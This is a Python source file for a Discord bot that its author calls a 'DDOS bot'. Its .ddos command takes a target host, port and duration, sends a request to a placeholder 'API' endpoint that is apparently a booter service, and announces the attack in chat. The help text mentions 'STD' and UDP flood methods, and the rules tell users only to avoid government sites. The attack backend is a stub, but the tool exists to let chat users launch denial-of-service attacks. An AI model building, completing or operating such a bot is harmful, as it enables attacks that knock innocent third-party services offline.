import discord
from discord.ext import commands
import requests
import argparse
from ipdata import ipdata
from pprint import pprint
token = "BOT TOKEN"
client = commands.Bot(command_prefix = ".")

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game("Hitting"))
    print("DDOS bot ready by Harrison ")

@client.command()
async def author(ctx):
    await ctx.send("Harrison/Unity")

@client.command()
async def rules(ctx):
    await ctx.send("Not really any jus dont use on multiple targets at a time and dont hit gov sites jus use ur brain!")


@client.command()
async def clear(ctx, amount=5):
    if amount > 10:
        await ctx.send("That is not allowed! Must be less than 10!")
    else:
        await ctx.channel.purge(limit=amount + 1)

@client.command()
async def ddos(ctx, host, port, time):
    r = requests.get("API")
    await ctx.send("Attcking " + host + " On port " + port + " For " + time + " Seconds")

@client.command()
async def method(ctx):
	await ctx.send("The way use the bot is .ddos ip port time currently using the STD method will let more experienced net users use udp and other good methods")

client.run(token)
